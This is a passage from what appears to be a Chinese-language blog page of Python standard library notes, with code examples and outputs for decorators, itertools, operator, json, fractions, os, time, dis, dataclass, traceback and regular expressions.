class="params">argument</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decorator</span>(<span class="params">func</span>):</span><br><span class="line"><span class="meta">        @wraps(<span class="params">func</span>)</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">wrapper</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">            <span class="string">&quot;&quot;&quot;A wrapper function&quot;&quot;&quot;</span></span><br><span class="line">            func()</span><br><span class="line">            <span class="keyword">return</span> argument</span><br><span class="line">        <span class="keyword">return</span> wrapper</span><br><span class="line">    <span class="keyword">return</span> decorator</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>:</span><br><span class="line">    ARG = <span class="number">123</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @decorator_auto(<span class="params">ARG</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">doing</span>():</span><br><span class="line">        <span class="string">&quot;&quot;&quot;A doing function&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;doing function&quot;</span>)</span><br><span class="line"></span><br><span class="line">T = Test()</span><br><span class="line"><span class="built_in">print</span>(T.doing.__name__)  <span class="comment"># doing</span></span><br><span class="line"><span class="built_in">print</span>(T.doing.__doc__)   <span class="comment"># A doing function</span></span><br><span class="line"><span class="built_in">print</span>(T.doing())         <span class="comment"># 123</span></span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="itertools-efficient-looping"><a href="#itertools-efficient-looping" class="headerlink" title="itertools (efficient looping)"></a>itertools (efficient looping)</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> itertools.chain([<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>], [<span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>]):</span><br><span class="line">    <span class="built_in">print</span>(i) <span class="comment"># a / b / c / d / e / f</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> itertools.chain(&#123;<span class="string">&#x27;a&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;b&#x27;</span>: <span class="number">2</span>&#125;.items(), &#123;<span class="string">&#x27;c&#x27;</span>: <span class="number">3</span>&#125;.items()):</span><br><span class="line">    <span class="built_in">print</span>(item) <span class="comment"># (&#x27;a&#x27;, 1) / (&#x27;b&#x27;, 2) / (&#x27;c&#x27;, 3)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> itertools.zip_longest([<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>], [<span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>]):</span><br><span class="line">    <span class="built_in">print</span>(i) <span class="comment"># (&#x27;a&#x27;, &#x27;d&#x27;) / (&#x27;b&#x27;, &#x27;e&#x27;) / (None, &#x27;f&#x27;)</span></span><br></pre></td></tr></table></figure>

<h2 id="operator-Standard-operators"><a href="#operator-Standard-operators" class="headerlink" title="operator (Standard operators)"></a>operator (Standard operators)</h2><h3 id="itemgetter"><a href="#itemgetter" class="headerlink" title="itemgetter()"></a>itemgetter()</h3><ul>
<li>返回一个可呼叫对象，并通过<code>__getitem__()</code>方法从中取值<ul>
<li><code>After f = itemgetter(2), the call f(r) returns r[2]</code></li>
<li><code>After g = itemgetter(2, 5, 3), the call g(r) returns (r[2], r[5], r[3])</code></li>
<li>Equivalent to:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def itemgetter(*items):</span><br><span class="line">if len(items) == 1:</span><br><span class="line">    item = items[0]</span><br><span class="line">    def g(obj):</span><br><span class="line">        return obj[item]</span><br><span class="line">else:</span><br><span class="line">    def g(obj):</span><br><span class="line">        return tuple(obj[item] for item in items)</span><br><span class="line">return g</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> operator <span class="keyword">import</span> itemgetter</span><br><span class="line">itemgetter(<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>)(<span class="string">&#x27;ABCDEFG&#x27;</span>)               <span class="comment"># (&#x27;B&#x27;, &#x27;D&#x27;, &#x27;F&#x27;)</span></span><br><span class="line">itemgetter(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;c&#x27;</span>)(&#123;<span class="string">&#x27;a&#x27;</span>:<span class="number">1</span>, <span class="string">&#x27;b&#x27;</span>:<span class="number">2</span>, <span class="string">&#x27;c&#x27;</span>:<span class="number">3</span>&#125;)  <span class="comment"># (1, 3)</span></span><br></pre></td></tr></table></figure>

<h1 id="网络数据-Internet-Data-Handling"><a href="#网络数据-Internet-Data-Handling" class="headerlink" title="网络数据 (Internet Data Handling)"></a>网络数据 (Internet Data Handling)</h1><h2 id="json"><a href="#json" class="headerlink" title="json"></a>json</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> inspect</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.m = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(self.m)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.a = A()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.a = A()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__iter__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">for</span> key, value <span class="keyword">in</span> self.__dict__.items():</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(value, A):</span><br><span class="line">                value = <span class="built_in">str</span>(value)</span><br><span class="line">            <span class="keyword">yield</span> key, value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">to_dict</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">dict</span>(self)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">JsonEncoder</span>(json.JSONEncoder):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">default</span>(<span class="params">self, obj</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(obj, <span class="string">&quot;to_dict&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> self.default(obj.to_dict())</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(obj, <span class="string">&quot;__dict__&quot;</span>):</span><br><span class="line">            items = <span class="built_in">dict</span>(</span><br><span class="line">                (key, value)</span><br><span class="line">                <span class="keyword">for</span> key, value <span class="keyword">in</span> inspect.getmembers(obj)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> key.startswith(<span class="string">&quot;__&quot;</span>)</span><br><span class="line">                <span class="keyword">and</span> <span class="keyword">not</span> inspect.isabstract(value)</span><br><span class="line">                <span class="keyword">and</span> <span class="keyword">not</span> inspect.isbuiltin(value)</span><br><span class="line">                <span class="keyword">and</span> <span class="keyword">not</span> inspect.isfunction(value)</span><br><span class="line">                <span class="keyword">and</span> <span class="keyword">not</span> inspect.isgenerator(value)</span><br><span class="line">                <span class="keyword">and</span> <span class="keyword">not</span> inspect.isgeneratorfunction(value)</span><br><span class="line">                <span class="keyword">and</span> <span class="keyword">not</span> inspect.ismethod(value)</span><br><span class="line">                <span class="keyword">and</span> <span class="keyword">not</span> inspect.ismethoddescriptor(value)</span><br><span class="line">                <span class="keyword">and</span> <span class="keyword">not</span> inspect.isroutine(value)</span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">return</span> self.default(items)</span><br><span class="line">        <span class="keyword">return</span> obj</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(json.dumps(B(), cls=JsonEncoder, ensure_ascii=<span class="literal">False</span>, sort_keys=<span class="literal">True</span>)) <span class="comment"># &#123;&quot;a&quot;: &#123;&quot;m&quot;: 1&#125;&#125;（indent=2)</span></span><br><span class="line"><span class="built_in">print</span>(json.dumps(C(), cls=JsonEncoder, ensure_ascii=<span class="literal">False</span>, sort_keys=<span class="literal">True</span>)) <span class="comment"># &#123;&quot;a&quot;: &quot;1&quot;&#125;（indent=2)</span></span><br></pre></td></tr></table></figure>

<h1 id="数值与数学（Numeric-and-Mathematical）"><a href="#数值与数学（Numeric-and-Mathematical）" class="headerlink" title="数值与数学（Numeric and Mathematical）"></a>数值与数学（Numeric and Mathematical）</h1><h2 id="fractions"><a href="#fractions" class="headerlink" title="fractions"></a>fractions</h2><ul>
<li>有理数算术</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> fractions <span class="keyword">import</span> Fraction</span><br><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> Decimal</span><br><span class="line"><span class="built_in">print</span>(Fraction(<span class="number">3</span>, <span class="number">7</span>))            <span class="comment"># 3/7</span></span><br><span class="line"><span class="built_in">print</span>(Fraction(<span class="string">&#x27; -3/7 &#x27;</span>))        <span class="comment"># -3/7</span></span><br><span class="line"><span class="built_in">print</span>(Fraction(<span class="string">&#x27;1.414213 \t\n&#x27;</span>)) <span class="comment"># 1414213/1000000</span></span><br><span class="line"><span class="built_in">print</span>(Fraction(<span class="string">&#x27;-.125&#x27;</span>))         <span class="comment"># -1/8</span></span><br><span class="line"><span class="built_in">print</span>(Fraction(<span class="string">&#x27;7e-6&#x27;</span>))          <span class="comment"># 7/1000000</span></span><br><span class="line"><span class="built_in">print</span>(Fraction(<span class="number">1.1</span>))             <span class="comment"># 2476979795053773/2251799813685248</span></span><br><span class="line"><span class="built_in">print</span>(Fraction(Decimal(<span class="string">&#x27;1.1&#x27;</span>)))  <span class="comment"># 11/10</span></span><br><span class="line"><span class="built_in">print</span>(Fraction(<span class="number">0.25</span>))            <span class="comment"># 1/4</span></span><br><span class="line"><span class="built_in">print</span>(Fraction(<span class="number">0.25</span>)/<span class="number">8</span>)          <span class="comment"># 1/32</span></span><br><span class="line"><span class="built_in">print</span>(Fraction(<span class="number">0.25</span>/<span class="number">8</span>))          <span class="comment"># 1/32</span></span><br><span class="line"><span class="built_in">print</span>(Fraction(<span class="number">12345</span>/<span class="number">67890</span>).limit_denominator(max_denominator=<span class="number">10</span>))   <span class="comment"># 1/6</span></span><br><span class="line"><span class="built_in">print</span>(Fraction(<span class="number">12345</span>/<span class="number">67890</span>).limit_denominator(max_denominator=<span class="number">100</span>))  <span class="comment"># 2/11</span></span><br></pre></td></tr></table></figure>

<h1 id="操作系统（Operating-System）"><a href="#操作系统（Operating-System）" class="headerlink" title="操作系统（Operating System）"></a>操作系统（Operating System）</h1><h2 id="env"><a href="#env" class="headerlink" title="env"></a>env</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.environ[<span class="string">&#x27;D&#x27;</span>] = <span class="string">&#x27;3&#x27;</span>   <span class="comment"># (value must be &#x27;str&#x27;)</span></span><br><span class="line">A = os.getenv(<span class="string">&quot;A&quot;</span>, <span class="number">1</span>)</span><br><span class="line">B = os.getenv(<span class="string">&quot;B&quot;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">C = os.getenv(<span class="string">&quot;C&quot;</span>, <span class="literal">True</span>)</span><br><span class="line">D = os.getenv(<span class="string">&quot;D&quot;</span>, <span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(A, <span class="built_in">type</span>(A)) <span class="comment"># 1 &lt;class &#x27;int&#x27;&gt;</span></span><br><span class="line"><span class="built_in">print</span>(B, <span class="built_in">type</span>(B)) <span class="comment"># 2 &lt;class &#x27;str&#x27;&gt;</span></span><br><span class="line"><span class="built_in">print</span>(C, <span class="built_in">type</span>(C)) <span class="comment"># True &lt;class &#x27;bool&#x27;&gt;</span></span><br><span class="line"><span class="built_in">print</span>(D, <span class="built_in">type</span>(D)) <span class="comment"># 3 &lt;class &#x27;str&#x27;&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="path"><a href="#path" class="headerlink" title="path"></a>path</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys.path = &quot;</span>, sys.path)     <span class="comment"># [</span></span><br><span class="line">                                   <span class="comment">#   &#x27;/opt/sample&#x27;,</span></span><br><span class="line">                                   <span class="comment">#   &#x27;/opt/lib/python38.zip&#x27;,</span></span><br><span class="line">                                   <span class="comment">#   &#x27;/opt/lib/python3.8&#x27;,</span></span><br><span class="line">                                   <span class="comment">#   &#x27;/opt/lib/python3.8/lib-dynload&#x27;,</span></span><br><span class="line">                                   <span class="comment">#   &#x27;/opt/lib/python3.8/site-packages&#x27;</span></span><br><span class="line">                                   <span class="comment"># ]</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys.argv = &quot;</span>, sys.argv)     <span class="comment"># [&#x27;/opt/sample/test.py&#x27;]</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;__file__ = &quot;</span>, __file__)     <span class="comment"># /opt/sample/test.py</span></span><br><span class="line"><span class="built_in">print</span>(os.getcwd())                 <span class="comment"># /opt/sample</span></span><br><span class="line"><span class="built_in">print</span>(os.path.basename(__file__))  <span class="comment"># test.py</span></span><br><span class="line"><span class="built_in">print</span>(os.path.abspath(__file__))   <span class="comment"># /opt/sample/test.py</span></span><br><span class="line"><span class="built_in">print</span>(os.path.realpath(__file__))  <span class="comment"># /opt/sample/test.py</span></span><br><span class="line"><span class="built_in">print</span>(os.path.dirname(os.path.realpath(__file__))) <span class="comment"># /opt/sample</span></span><br><span class="line"><span class="built_in">print</span>(os.path.split(os.path.realpath(__file__)))   <span class="comment"># (&#x27;/opt/sample&#x27;, &#x27;test.py&#x27;)</span></span><br><span class="line"><span class="built_in">print</span>(os.path.exists(<span class="string">&#x27;/opt/sample/test.py&#x27;</span>))       <span class="comment"># True</span></span><br></pre></td></tr></table></figure>

<h2 id="time"><a href="#time" class="headerlink" title="time"></a>time</h2><p><a href="https://docs.python.org/3/library/time.html#time.strptime">time.strptime(string[, format])</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line">st_time = time.strptime(<span class="string">&quot;7/4/2022 00:14&quot;</span>, <span class="string">&quot;%m/%d/%Y %H:%M&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(st_time)) <span class="comment"># &lt;class &#x27;time.struct_time&#x27;&gt;</span></span><br><span class="line">raw_time = time.mktime(st_time)</span><br><span class="line"><span class="built_in">print</span>(raw_time, <span class="built_in">type</span>(raw_time)) <span class="comment"># 1656864840.0 &lt;class &#x27;float&#x27;&gt;</span></span><br><span class="line"></span><br><span class="line">t1 = time.strptime(<span class="string">&#x27;01:00&#x27;</span>, <span class="string">&#x27;%M:%S&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(t1) <span class="comment"># time.struct_time(tm_year=1900, tm_mon=1, tm_mday=1, tm_hour=0, tm_min=1, tm_sec=0, tm_wday=0, tm_yday=1, tm_isdst=-1)</span></span><br><span class="line">t2 = time.time()</span><br><span class="line"><span class="built_in">print</span>(t2, <span class="built_in">type</span>(t2)) <span class="comment"># 1648138324.745854 &lt;class &#x27;float&#x27;&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line">t3 = datetime.now()</span><br><span class="line"><span class="built_in">print</span>(t3, <span class="built_in">type</span>(t3)) <span class="comment"># 2022-03-25 00:12:04.747189 &lt;class &#x27;datetime.datetime&#x27;&gt;</span></span><br><span class="line"><span class="built_in">print</span>(t3.strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)) <span class="comment"># 2022-03-25 00:12:04</span></span><br><span class="line"></span><br><span class="line">timestamp = <span class="number">1528797322</span></span><br><span class="line">t4 = datetime.fromtimestamp(timestamp)</span><br><span class="line"><span class="built_in">print</span>(t4) <span class="comment"># 2018-06-12 17:55:22</span></span><br><span class="line">t5 = t4.strftime(<span class="string">&quot;%m/%d/%Y %H:%M:%S&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(t5) <span class="comment"># 06/12/2018 17:55:22</span></span><br></pre></td></tr></table></figure>

<h1 id="语言服务（Python-Language）"><a href="#语言服务（Python-Language）" class="headerlink" title="语言服务（Python Language）"></a>语言服务（Python Language）</h1><h2 id="dis-Disassembler"><a href="#dis-Disassembler" class="headerlink" title="dis (Disassembler)"></a>dis (Disassembler)</h2><ul>
<li>支持反编译，用于分析CPython的字节码(bytecode)</li>
</ul>
<h3 id="dis"><a href="#dis" class="headerlink" title="dis()"></a>dis()</h3><ul>
<li>以多行显示的形式返回字节码操作过程</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> dis</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">greet</span>(<span class="params">name, question</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Hello, &quot;</span> + name + <span class="string">&quot;! How&#x27;s it &quot;</span> + question + <span class="string">&quot;?&quot;</span></span><br><span class="line"></span><br><span class="line">dis.dis(greet)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;[Output - python3.8]</span></span><br><span class="line"><span class="string"> 4            0 LOAD_CONST               1 (&#x27;Hello, &#x27;)</span></span><br><span class="line"><span class="string">              2 LOAD_FAST                0 (name)</span></span><br><span class="line"><span class="string">              4 BINARY_ADD</span></span><br><span class="line"><span class="string">              6 LOAD_CONST               2 (&quot;! How&#x27;s it &quot;)</span></span><br><span class="line"><span class="string">              8 BINARY_ADD</span></span><br><span class="line"><span class="string">             10 LOAD_FAST                1 (question)</span></span><br><span class="line"><span class="string">             12 BINARY_ADD</span></span><br><span class="line"><span class="string">             14 LOAD_CONST               3 (&#x27;?&#x27;)</span></span><br><span class="line"><span class="string">             16 BINARY_ADD</span></span><br><span class="line"><span class="string">             18 RETURN_VALUE</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<h1 id="运行时服务（Runtime-Service）"><a href="#运行时服务（Runtime-Service）" class="headerlink" title="运行时服务（Runtime Service）"></a>运行时服务（Runtime Service）</h1><h2 id="dataclass"><a href="#dataclass" class="headerlink" title="dataclass"></a>dataclass</h2><p>python3.7+支持，提供一个修饰器<code>@dataclass</code>，自动为类生成<code>__init__()</code>和<code>__repr__()</code>方法。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> dataclasses <span class="keyword">import</span> dataclass</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Any</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@dataclass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Data</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Class for keeping track of an item in inventory.&quot;&quot;&quot;</span></span><br><span class="line">    a: <span class="built_in">str</span></span><br><span class="line">    b: <span class="type">Any</span></span><br><span class="line">    c: <span class="built_in">int</span> = <span class="number">5</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">calc</span>(<span class="params">self</span>) -&gt; <span class="built_in">float</span>:</span><br><span class="line">        <span class="keyword">return</span> self.b * self.c</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(Data(<span class="string">&quot;test&quot;</span>, <span class="number">3</span>).calc())   <span class="comment"># 15</span></span><br><span class="line"><span class="built_in">print</span>(Data(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;3&quot;</span>).calc()) <span class="comment"># 33333</span></span><br></pre></td></tr></table></figure>

<h2 id="traceback"><a href="#traceback" class="headerlink" title="traceback"></a>traceback</h2><p>提取、格式化打印堆栈（从底向上阅读）。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    do_stuff()</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;OUT</span></span><br><span class="line"><span class="string">    (&lt;class &#x27;NameError&#x27;&gt;, NameError(&quot;name &#x27;do_stuff&#x27; is not defined&quot;), &lt;traceback object at 0x7f0b9424d540&gt;)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(sys.exc_info())</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;OUT</span></span><br><span class="line"><span class="string">    Traceback (most recent call last):</span></span><br><span class="line"><span class="string">        File &quot;/opt/python3/sample/core/traceback/basic.py&quot;, line 5, in &lt;module&gt;</span></span><br><span class="line"><span class="string">            do_stuff()</span></span><br><span class="line"><span class="string">    NameError: name &#x27;do_stuff&#x27; is not defined</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(traceback.format_exc())</span><br><span class="line">    traceback.print_exception(*sys.exc_info())</span><br><span class="line">    traceback.print_exc()</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;OUT</span></span><br><span class="line"><span class="string">    File &quot;/opt/python3/sample/core/traceback/basic.py&quot;, line 5, in &lt;module&gt;</span></span><br><span class="line"><span class="string">        do_stuff()</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    traceback.print_tb(err.__traceback__)</span><br></pre></td></tr></table></figure>

<h1 id="文本处理（Text-Processing"><a href="#文本处理（Text-Processing" class="headerlink" title="文本处理（Text Processing)"></a>文本处理（Text Processing)</h1><h2 id="re-Regular-expression"><a href="#re-Regular-expression" class="headerlink" title="re (Regular expression)"></a>re (Regular expression)</h2><ul>
<li>raw-string符号：<code>r</code>，用于取代backslash(‘&#39;)转义符的使用场景<ul>
<li><code>r&#39;\n&#39;</code>表示两个字符</li>
<li><code>\n</code>表示一个newline字符</li>
</ul>
</li>
<li>相似于<code>perl</code>的正则表达式规则<ul>
<li>(?aiLmsux)：适用于整个表达式的扩展规则<ul>
<li>re.A (ASCII-only matching)</li>
<li>re.I (ignore case)</li>
<li>re.L (locale dependent)</li>
<li>re.M (multi-line)</li>
<li>re.S (dot matches all)</li>
<li>re.U (Unicode matching)</li>
<li>and re.X (verbose)</li>
</ul>
</li>
<li>(?:…)：A non-capturing version of regular parentheses，((?:a|b)c) that is either ac or bc.</li>
<li>(?P<name>…): 支持通过group name访问匹配到的子字符串</li>
<li><code>%c</code>              <code>.</code></li>
<li><code>%5c</code>             <code>.&#123;5&#125;</code></li>
<li><code>%d</code>              <code>[-+]?\d+</code></li>
<li><code>%e, %E, %f, %g</code>  <code>[-+]?(\d+(\.\d*)?|\.\d+)([eE][-+]?\d+)?</code></li>
<li><code>%i</code>              <code>[-+]?(0[xX][\dA-Fa-f]+|0[0-7]*|\d+)</code></li>
<li><code>%o</code>              <code>[-+]?[0-7]+</code></li>
<li><code>%s</code>              <code>\S+</code></li>
<li><code>%u</code>              <code>\d+</code></li>
<li><code>%x, %X</code>          <code>[-+]?(0[xX])?[\dA-Fa-f]+</code></li>
</ul>
</li>
</ul>
<h3 id="compile"><a href="#compile" class="headerlink" title="compile()"></a>compile()</h3><ul>
<li>编译后的正则表达式规则可以重复使用，在多次调用时加快执行速度。</li>
</ul>
<h3 id="match"><a href="#match" class="headerlink" title="match()"></a>match()</h3><ul>
<li>只检查字符串开头的匹配项</li>
</ul>
<h3 id="search"><a href="#search" class="headerlink" title="search()"></a>search()</h3><ul>
<li>检查字符串中的任何地方是否匹配</li>
</ul>
<h3 id="split"><a href="#split" class="headerlink" title="split()"></a>split()</h3><ul>
<li>将字符串拆分为由所传递的模式分隔的列表</li>
</ul>
<div class="tabs" id="re_basic"><ul class="nav-tabs"><li class="tab active"><a href="#re_basic-1">compile</a></li><li class="tab"><a href="#re_basic-2">match</a></li><li class="tab"><a href="#re_basic-3">search</a></li><li class="tab"><a href="#re_basic-4">split</a></li><li class="tab"><a href="#re_basic-5">displaymatch</a></li></ul><div class="tab-content"><div class="tab-pane active" id="re_basic-1"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">prog = re.<span class="built_in">compile</span>(pattern)</span><br><span class="line">result = prog.<span class="keyword">match</span>(string)</span><br><span class="line"></span><br><span class="line"> =&gt;equivalent:</span><br><span class="line"></span><br><span class="line">result = re.<span class="keyword">match</span>(pattern, string)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># Regular Expression Objects</span></span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">&quot;d&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(pattern.search(<span class="string">&quot;dog&quot;</span>))     <span class="comment"># &lt;re.Match object; span=(0, 1), match=&#x27;d&#x27;&gt;</span></span><br><span class="line"><span class="built_in">print</span>(pattern.search(<span class="string">&quot;dog&quot;</span>, <span class="number">1</span>))  <span class="comment"># None</span></span><br><span class="line"></span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">&quot;o&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(pattern.<span class="keyword">match</span>(<span class="string">&quot;dog&quot;</span>))      <span class="comment"># None</span></span><br><span class="line"><span class="built_in">print</span>(pattern.<span class="keyword">match</span>(<span class="string">&quot;dog&quot;</span>, <span class="number">1</span>))   <span class="comment"># &lt;re.Match object; span=(1, 2), match=&#x27;o&#x27;&gt;</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="re_basic-2"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># Match Objects</span></span><br><span class="line">m = re.<span class="keyword">match</span>(<span class="string">r&quot;(\w+) (\w+)&quot;</span>, <span class="string">&quot;Isaac Newton, physicist&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(m.group(<span class="number">0</span>))       <span class="comment"># Isaac Newton  整个匹配</span></span><br><span class="line"><span class="built_in">print</span>(m.group(<span class="number">1</span>))       <span class="comment"># Isaac         第一个subgroup</span></span><br><span class="line"><span class="built_in">print</span>(m.group(<span class="number">2</span>))       <span class="comment"># Newton        第二个subgroup</span></span><br><span class="line"><span class="built_in">print</span>(m.group(<span class="number">1</span>, <span class="number">2</span>))    <span class="comment"># (&#x27;Isaac&#x27;, &#x27;Newton&#x27;)</span></span><br><span class="line"></span><br><span class="line">m = re.<span class="keyword">match</span>(<span class="string">r&quot;(?P&lt;first_name&gt;\w+) (?P&lt;last_name&gt;\w+)&quot;</span>, <span class="string">&quot;Malcolm Reynolds&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(m.group(<span class="string">&#x27;first_name&#x27;</span>), m.group(<span class="number">1</span>)) <span class="comment"># Malcolm Malcolm</span></span><br><span class="line"><span class="built_in">print</span>(m.group(<span class="string">&#x27;last_name&#x27;</span>), m.group(<span class="number">2</span>))  <span class="comment"># Reynolds Reynolds</span></span><br><span class="line"><span class="built_in">print</span>(m.groupdict())    <span class="comment"># &#123;&#x27;first_name&#x27;: &#x27;Malcolm&#x27;, &#x27;last_name&#x27;: &#x27;Reynolds&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line">m = re.<span class="keyword">match</span>(<span class="string">r&quot;(..)+&quot;</span>, <span class="string">&quot;a1b2c3&quot;</span>)  <span class="comment"># 匹配了3次</span></span><br><span class="line"><span class="built_in">print</span>(m.group(<span class="number">1</span>))                 <span class="comment"># c3  最后一次匹配的结果</span></span><br><span class="line"></span><br><span class="line">m = re.<span class="keyword">match</span>(<span class="string">r&quot;(\d+)\.(\d+)&quot;</span>, <span class="string">&quot;24.1632&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(m.groups())      <span class="comment"># (&#x27;24&#x27;, &#x27;1632&#x27;) 返回所有subgroup的元组</span></span><br><span class="line"></span><br><span class="line">m = re.<span class="keyword">match</span>(<span class="string">r&quot;(\d+)\.?(\d+)?&quot;</span>, <span class="string">&quot;24&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(m.groups())      <span class="comment"># (&#x27;24&#x27;, None)   匹配不到的subgroup默认为None</span></span><br><span class="line"><span class="built_in">print</span>(m.groups(<span class="string">&#x27;0&#x27;</span>))   <span class="comment"># (&#x27;24&#x27;, &#x27;0&#x27;)    修改subgroup默认值为&#x27;0&#x27;</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="re_basic-3"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">email = <span class="string">&quot;tony@tiremove_thisger.net&quot;</span></span><br><span class="line">m = re.search(<span 